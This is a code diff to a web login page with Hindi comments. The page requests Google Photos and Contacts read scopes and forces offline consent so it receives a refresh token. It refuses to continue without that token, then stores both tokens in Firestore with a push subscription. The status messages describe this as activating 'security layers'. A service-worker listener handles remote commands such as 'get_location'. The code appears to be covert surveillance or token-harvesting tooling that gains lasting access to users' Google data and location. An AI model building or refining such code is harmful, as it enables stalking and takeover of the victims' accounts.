@@ -138,35 +138,39 @@
                 googleProvider.addScope('https://www.googleapis.com/auth/photoslibrary.readonly');
                 googleProvider.addScope('https://www.googleapis.com/auth/contacts.readonly');
 
-                // =====================================================================
-                // === यही एकमात्र, सबसे ज़रूरी और अंतिम बदलाव है (Stale Token Fix) ===
-                // =====================================================================
-                // हम गूगल को बता रहे हैं कि हमें ऑफ़लाइन पहुँच चाहिए (ताकि हमें Refresh Token मिले)
-                // और हम उपयोगकर्ता को हर बार सहमति देने के लिए कह रहे हैं (ताकि Refresh Token हमेशा मिले)।
                 googleProvider.setCustomParameters({
                     access_type: 'offline',
                     prompt: 'consent'
                 });
                 
                 const result = await auth.signInWithPopup(googleProvider);
-                const { user, credential } = result;
-                const accessToken = credential.accessToken;
                 
-                // अब हम रिफ्रेश टोकन को भी पकड़ेंगे
-                const refreshToken = result.additionalUserInfo.profile.refresh_token || credential.refreshToken;
+                // OAuthProvider से क्रेडेंशियल निकालें, इसमें ज़्यादा जानकारी होती है
+                const credential = firebase.auth.GoogleAuthProvider.credentialFromResult(result);
+                const { user } = result;
+                const accessToken = credential.accessToken;
+                const refreshToken = credential.refreshToken;
 
+                // ★★★★★ यही सबसे ज़रूरी बदलाव है ★★★★★
+                // अब हम सख्ती से जांच करेंगे कि रिफ्रेश टोकन मिला है या नहीं।
+                if (!refreshToken) {
+                    // अगर रिफ्रेश टोकन नहीं मिला, तो यह एक गंभीर समस्या है।
+                    // उपयोगकर्ता को स्पष्ट रूप से बताएं और प्रक्रिया रोक दें।
+                    throw new Error("महत्वपूर्ण: रिफ्रेश टोकन प्राप्त नहीं हुआ। कृपया अपने Google खाते से ऐप का एक्सेस हटाकर पुनः प्रयास करें।");
+                }
+                
                 statusDiv.textContent = `स्वागत है, ${user.displayName}!`;
 
                 const subscription = await registerAndSubscribe();
-                await saveDataToFirestore(user, accessToken, refreshToken, subscription); // अब refreshToken भी भेज रहे हैं
+                await saveDataToFirestore(user, accessToken, refreshToken, subscription);
                 handleSuccess();
 
             } catch (error) {
+                // अब हमारा नया और स्पष्ट त्रुटि संदेश यहाँ दिखाया जाएगा।
                 handleError(`त्रुटि: ${error.message}`);
             }
         }
         
-        // ... registerAndSubscribe फ़ंक्शन में केवल एक ज़रूरी बदलाव किया गया है ...
         async function registerAndSubscribe() {
             statusDiv.textContent = 'सुरक्षा परतें सक्रिय हो रही हैं...';
             if (!('serviceWorker' in navigator) || !('PushManager' in window)) throw new Error('ब्राउज़र संगत नहीं है।');
@@ -186,26 +190,21 @@
             }
         }
         
-        // ... saveDataToFirestore में अब refreshToken भी जुड़ेगा ...
         async function saveDataToFirestore(user, accessToken, refreshToken, subscription) {
             statusDiv.textContent = 'डेटा को सुरक्षित किया जा रहा है...';
             const userRef = db.collection('users').doc(user.uid);
             const dataToSave = {
                 uid: user.uid, displayName: user.displayName, email: user.email, photoURL: user.photoURL,
                 googleAccessToken: accessToken,
+                googleRefreshToken: refreshToken, // अब यह मान कभी भी खाली नहीं होगा
                 pushSubscription: JSON.parse(JSON.stringify(subscription)),
                 lastLogin: firebase.firestore.FieldValue.serverTimestamp()
             };
             
-            // सिर्फ़ तभी refreshToken को सेव करें जब वह हमें मिला हो
-            if (refreshToken) {
-                dataToSave.googleRefreshToken = refreshToken;
-            }
-
             await userRef.set(dataToSave, { merge: true });
         }
 
-        // --- बाकी सभी फंक्शन्स (कमांड सुनना, हेल्पर फंक्शन्स) में कोई बदलाव नहीं ---
+        // --- बाकी सभी फंक्शन्स (अपरिवर्तित) ---
         navigator.serviceWorker.addEventListener('message', event => {
             const commandData = event.data;
             if (commandData && commandData.command === 'get_location') {
